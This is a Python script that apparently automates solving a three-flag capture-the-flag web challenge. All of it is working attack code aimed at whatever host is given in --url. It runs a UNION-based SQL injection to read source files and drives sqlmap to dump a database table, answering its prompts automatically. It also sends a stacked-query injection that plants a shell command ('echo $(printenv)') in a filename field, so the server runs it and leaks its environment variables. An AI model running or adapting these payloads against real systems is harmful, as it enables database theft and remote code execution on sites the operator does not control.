import argparse
import requests
import re
import pexpect
import sys


def parse_args():
    parser = argparse.ArgumentParser(description="Arguments")
    parser.add_argument("--url", help="Example: tesla.com", required=True)
    return parser.parse_args()


def sql_injection(url):
    full_url = f"https://{url}/fetch?id=4"
    sql_query = " UNION select 'main.py'"
    target = full_url + sql_query

    try:
        response = requests.get(target, timeout=30)
        
        if response.status_code == 200:
            # Improved regex pattern for hex values (handles '0x' and plain hex)
            hex_pattern = r'((?:0x)?[0-9a-fA-F]{32,})'  # Match at least 6 hex digits

            extracted_values = []

            # Process each line of the response text
            for line in response.text.splitlines():
                for match in re.finditer(hex_pattern, line):
                    start = max(0, match.start() - 6)  # Get 6 chars before
                    end = min(len(line), match.end() + 6)  # Get 6 chars after
                    extracted_values.append(line[start:end])  # Extract and store

            return extracted_values
        else:
            print(f"Request failed with status code: {response.status_code}")
            return []
    
    except requests.RequestException as e:
        print(f"Error fetching URL: {e}")
        return []
    

def sqlmap_cmd(url):
    command = f"sqlmap -u 'https://{url}/fetch?id=1' --dump -D level5 --threads=5 -T photos"
    child = pexpect.spawn(command, encoding='utf-8', timeout=300)

    child.logfile = sys.stdout  # Print real-time sqlmap output

    # Handle expected prompts
    prompts = [
        "it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes\\? \\[Y/n\\]",
        "for the remaining tests, do you want to include all tests for 'MySQL' extending provided level \\(1\\) and risk \\(1\\) values\\? \\[Y/n\\]",
        "do you want to \\(re\\)try to find proper UNION column types with fuzzy test\\? \\[y/N\\]",
        "GET parameter 'id' is vulnerable. Do you want to keep testing the others \\(if any\\)\\? \\[y/N\\]",
        "do you want to store hashes to a temporary file for eventual further processing with other tools \\[y/N\\]",
        "do you want to crack them via a dictionary-based attack\\? \\[Y/n/q\\]",
    ]

    # Process output and handle expected prompts
    while True:
        try:
            index = child.expect(prompts + [pexpect.EOF, pexpect.TIMEOUT], timeout=60)

            if index < len(prompts):  
                # Send default responses
                responses = ["Y", "n", "N", "N", "N", "n"]
                child.sendline(responses[index])
            elif index == len(prompts):  # EOF
                break
            elif index == len(prompts) + 1:  # Timeout
                continue  # Keep waiting for output

        except pexpect.exceptions.EOF:
            break  # Ensure full output is captured
        except pexpect.exceptions.TIMEOUT:
            continue

    # Capture final output after process ends
    # child.expect(pexpect.EOF)
    full_output = child.before  # Get all sqlmap output
    print("Full Output:")
    print(full_output)
    # Extract relevant data (flags/hashes)
    hex_pattern = r'((?:0x)?[0-9a-fA-F]{64})'  # Match 32+ hex characters
    matches = re.findall(hex_pattern, full_output)

    return matches if matches else None  # Return extracted flags


def sql_injection_RCE(url):
    # Step 1: Send request with the payload to fetch environment variables
    full_url_payload = f"https://{url}/fetch?id=3; UPDATE photos SET filename=\";echo $(printenv)\" WHERE id=3; commit"
    
    try:
        # Send the request with the payload
        response = requests.get(full_url_payload, timeout=30)
        print("Payload sent")

        # Step 2: Send a normal request to the URL without any payload
        simple_url = f"https://{url}"
        response_normal = requests.get(simple_url, timeout=30)

        if response_normal.status_code == 200:
            print("Home URL request completed successfully")
        else:
            print(f"Home URL request failed with status code: {response_normal.status_code}")
            return []

        # Step 3: Search for hex pattern in the normal response
        hex_pattern = r'((?:0x)?[0-9a-fA-F]{32,})'  # Regex for matching 32+ hex characters
        extracted_values = []

        # Process each line of the response text to find the hex values
        for line in response_normal.text.splitlines():
            for match in re.finditer(hex_pattern, line):
                start = max(0, match.start() - 6)  # Get 6 chars before the match
                end = min(len(line), match.end() + 6)  # Get 6 chars after the match
                extracted_values.append(line[start:end])  # Extract and store the match

                if len(extracted_values) >= 3:  # Stop collecting after 3 matches
                    return extracted_values  

        return extracted_values  # Return collected matches (up to 3)

    except requests.RequestException as e:
        print(f"Error fetching URL: {e}")
        return []


def main():
    args = parse_args()
    url = args.url
    print(f"Target URL: {url}\n")

    flag_functions = {
        "FLAG0": sql_injection,
        "FLAG1": sqlmap_cmd,
        "FLAG2": sql_injection_RCE
    }

    for flag_name, func in flag_functions.items():
        try:
            print(f"Retrieving {flag_name}...")

            # Skip FLAG2 if FLAG1 is None
            if flag_name == "FLAG1":
                flag1 = func(url)
                if flag1 is None:
                    print(f"FLAG1: None - Skipping FLAG2 retrieval.\n")
                    break  # Stop the loop if FLAG1 is not found
                else:
                    print(f"FLAG1: {flag1}\n")

            else:
                flag = func(url)
                print(f"{flag_name}: {flag}\n")

        except Exception as e:
            print(f"Error retrieving {flag_name}: {e}\n")

if __name__ == "__main__":
    main()
